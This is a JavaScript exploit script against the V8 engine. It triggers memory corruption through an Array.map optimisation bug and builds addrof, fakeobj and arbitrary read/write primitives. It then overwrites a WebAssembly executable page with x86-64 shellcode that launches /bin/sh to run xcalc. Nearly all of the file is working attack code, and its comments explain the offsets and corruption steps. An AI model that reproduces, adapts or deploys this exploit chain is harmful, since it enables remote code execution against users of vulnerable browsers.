// Generate a large array to ensure TurboFan won't inline array constructors
Array(2**30);

// Create a fast, holey smi array
// Fast, holey array refer to the use of arrays internally
// (rather than dictionaries internally for sparse, holey arrays)
// Ref: https://v8.dev/blog/fast-properties
var holey_smi_array = [1, 2, ,,, 3];
var float_array;
var typed_array;
var object;

// Offset of float array length field from the Array.map output
const float_array_length_offset = 23;
// Offset of typed array length field from the Array.map output
const typed_array_length_offset = 24;
// Offset of typed array address pointer from the Array.map output
const typed_array_address_offset = 25;
// Offset of object['b'] from the Array.map output
const object_property_b_offset = 33;

function mapping(array) {
    function callback(_element, index) {
        if (index == 0) {
            float_array = [0.1, 0.2];

            typed_array = new BigUint64Array(2);
            // The n suffix indicates bigint literal 
            typed_array[0] = 0x41414141n;
            typed_array[1] = 0x42424242n;

            object = {'a': 0x31323334, 'b': 1};
            object['b'] = object;
        }

        // Minimize the corruption for stability
        if (index > float_array_length_offset)
            throw 'stop';
        
        return index;
    }

    return array.map(callback);
}

for (let i=0; i<10**5; i++)
    mapping(holey_smi_array);

// Lengthen the array but ensure it points to a array (non-dictionary) store
holey_smi_array.length = (32 * 1024 * 1024) - 1;
holey_smi_array.fill(1, float_array_length_offset, float_array_length_offset + 1);
holey_smi_array.fill(1, float_array_length_offset + 2);
holey_smi_array.push(2);
holey_smi_array.length += 500;

// The elements of holey_smi_array are now:
// (can verify with %DebugPrint with debug d8)
//
//                   0: 1
//                   1: 2
//                 2-4: <hole>
//                   5: 3
//                6-22: <hole>
//                  23: 1
//                  24: <hole>
//         25-33554430: 1
//            33554431: 2
//   33554432-33554931: <hole>

// Exception caused by the throw within the mapping callback
try { mapping(holey_smi_array); } catch (e) { }

// TODO Show the corruption of float_array, typed_array and object.
//      Need to first review writeups/docs defining object/array memory layout.
//      Use gdb and/or addrof/read (defined below) to determine specifics.

var view = new DataView(new ArrayBuffer(8));

Number.prototype.f2i = function() {
    view.setFloat64(0, this);
    return view.getBigUint64(0);
};

Number.prototype.i2f = function() {
    view.setBigUint64(0, BigInt(this));
    return view.getFloat64();
};

BigInt.prototype.i2f = function() {
    view.setBigUint64(0, this);
    return view.getFloat64();
};

var output = function(...args) {
    let s = '';
    for (const arg of args)
        s += arg + ' ';
    document.write(s + '<br/>');
};

if (
  float_array.length == 2 ||
  float_array[typed_array_length_offset + 3].f2i() != 0x41414141 ||
  float_array[typed_array_length_offset + 4].f2i() != 0x42424242 ||
  float_array[typed_array_length_offset + 8].f2i() != 0x3132333400000000n
) {
    output('float_array corruption failed');
}

// TODO Both read and write require offsetting the address by -0x1f
//      Investigate and document why this is necessary.
//      The fakeobj primitive does not seem to require this.

function read(addr) {
    let orig_addr = float_array[typed_array_address_offset];
    float_array[typed_array_address_offset] = (addr - 0x1fn).i2f();
    let retval = typed_array[0];
    float_array[typed_array_address_offset] = orig_addr;
    return retval;
}

function write(addr, val) {
    let orig_addr = float_array[typed_array_address_offset];
    float_array[typed_array_address_offset] = (addr - 0x1fn).i2f();
    typed_array[0] = val;
    float_array[typed_array_address_offset] = orig_addr;
}

function addrof(obj) {
    object['b'] = obj;
    return float_array[object_property_b_offset].f2i();
}

function fakeobj(addr) {
    float_array[object_property_b_offset] = addr.i2f();
    return object['b'];
}

var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_module = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_module);
var wasm_func = wasm_instance.exports.main;

var wasm_instance_addr = addrof(wasm_instance);
output('wasm_instance_addr', wasm_instance_addr.toString(16));

//%DebugPrint(wasm_func);
//output(wasm_func.constructor.name, typeof wasm_func); // Expected: Function function
var wasm_func_addr = addrof(wasm_func);
output('wasm_func_addr', wasm_func_addr.toString(16));

// SharedFunctionInfo
var sfi_addr = read(wasm_func_addr - 1n + 3n*8n);
output('sfi_addr', sfi_addr.toString(16));
//%DebugPrint(fakeobj(sfi_addr));
//output(typeof fakeobj(sfi_addr)); // Expected: symbol

// Code JS_TO_WASM_FUNCTION
var exported_func_data_addr = read(sfi_addr - 1n + 1n*8n);
output('exported_func_data_addr', exported_func_data_addr.toString(16));
//%DebugPrint(fakeobj(exported_func_data_addr));
//output(typeof fakeobj(exported_func_data_addr)); // Expected: symbol

var rwx_page_addr = read(exported_func_data_addr + 85n);
output('rwx_page_addr', rwx_page_addr.toString(16));

// Input / output buffer to be used within the shellcode
var buffer = new ArrayBuffer(4096);
var backing_store_addr = read(addrof(buffer) - 1n + 4n*8n);
output('backing_store_addr', backing_store_addr.toString(16));
// Offsets may vary with different versions of v8, validate with:
// new DataView(buffer).setBigUint64(0, 0x4141414141414141n);
// output(read(backing_store_addr + 0n*8n).toString(16));

// Launch execve("/bin/sh", {"-c", "/usr/bin/xcalc"}, {"DISPLAY=:0"})
var shellcode = [72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72, 184, 46, 121, 98, 96, 109, 98, 1, 1, 72, 49, 4, 36, 72, 184, 47, 117, 115, 114, 47, 98, 105, 110, 80, 72, 137, 231, 104, 59, 49, 1, 1, 129, 52, 36, 1, 1, 1, 1, 72, 184, 68, 73, 83, 80, 76, 65, 89, 61, 80, 49, 210, 82, 106, 8, 90, 72, 1, 226, 82, 72, 137, 226, 72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72, 184, 46, 121, 98, 96, 109, 98, 1, 1, 72, 49, 4, 36, 72, 184, 47, 117, 115, 114, 47, 98, 105, 110, 80, 49, 246, 86, 106, 8, 94, 72, 1, 230, 86, 72, 137, 230, 106, 59, 88, 15, 5, 144, 144, 144, 90, 90, 90, 90];

var buffer_addr_offsets = [];

for (offset of buffer_addr_offsets) {
    for (let i=0n; i<8n; i++)
        shellcode[offset+i] = (backing_store_addr >> (i*8n)) & 0x0ffn;
}

while (shellcode.length % 8 != 0)
    shellcode.push(0x90);

for (let i=0n; i<shellcode.length; i+=8n) {
    let x = 0n;
    for (let j=0n; j<8n; j++)
        x |= BigInt(shellcode[i+j]) << (j*8n);

    write(rwx_page_addr + i, x);
}

wasm_func();
